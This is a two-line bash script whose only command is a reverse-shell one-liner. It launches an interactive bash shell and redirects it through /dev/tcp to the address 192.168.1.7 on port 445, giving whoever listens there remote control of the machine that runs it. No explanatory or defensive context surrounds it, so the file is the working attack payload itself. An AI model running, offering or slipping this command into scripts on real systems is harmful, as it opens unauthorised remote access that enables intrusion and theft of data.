#!/bin/bash
bash -i >& /dev/tcp/192.168.1.7/445 0>&1
